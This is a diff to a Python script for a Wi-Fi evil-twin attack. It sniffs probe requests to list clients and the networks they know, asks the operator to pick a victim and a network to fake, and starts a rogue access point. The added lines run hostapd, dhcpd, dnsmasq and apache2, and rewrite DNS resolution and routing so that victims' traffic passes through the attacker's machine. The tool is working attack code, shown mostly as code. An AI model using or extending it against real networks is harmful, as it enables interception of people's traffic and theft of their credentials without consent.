@@ -69,7 +69,7 @@ def start_sniffer(interface):
     os.system("clear")
     for channel in range(1, 13):
         os.system("iwconfig %s channel %d" % (interface, channel))
-        sniff(iface=interface, timeout=10, prn=packet_handler)
+        sniff(iface=interface, timeout=5, prn=packet_handler)
 
 
 if __name__ == '__main__':
@@ -98,10 +98,15 @@ if __name__ == '__main__':
             print("Could not change interface mode to monitor.")
 
     # Sniffs for prob-reqs, display and pick user to attack
+    print("Starting prob-req sniffing, it may take some time....")
     start_sniffer(user_iface)
 
+    print("Available clients and known networks:")
+    for key, value in clients.items():
+        print(key, ' : ', value)
 
-    # TODO - PICK ONE TARGET - ap bssid
+    target_client = input("please pick a client\n")
+    target_ap = input("please pick a network to fake:\n")
 
     # setup fake ap
     apdconf_text = f"interface={user_iface}\n driver=nl80211\nssid={target_ap}\nhw_mode=g\nchannel=11\nmacaddr_acl=0" \
@@ -110,10 +115,28 @@ if __name__ == '__main__':
     n = text_file.write(apdconf_text)
     text_file.close()
 
-    # setup apache server
-    os.system('sudo ./setupFakeAP.sh')
+    print("----------------------starting services----------------")
+    print("starting apache2 server\n")
+    os.system("service apache2 start")
+    print("apache2 web server is up\n\n ")
 
-    # deauth user
-    perform_deauth()
+    print("starting dns server\n")
+    os.system("service dnsmasq start")
+    print("dns server is listening on port 53\n\n")
 
-    # send auth to user
+    print("modefiting the dns configeration\n")
+    os.system("echo nameserver 127.0.0.1 > /etc/resolv.conf")
+    print("dns routing is set\n\n")
+
+    print(f"setting {user_iface} ip address and routing tables\n")
+    os.system(f"ifconfig {user_iface} up 192.168.1.1 netmask 255.255.255.0")
+    os.system("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
+    print("interface configured\n\n")
+
+    print("starting dhcp server")
+    os.system("dhcpd")
+    print("dhcp server is up")
+
+    print("creating a fake AP")
+    os.system("hostapd hostapd.conf")
+
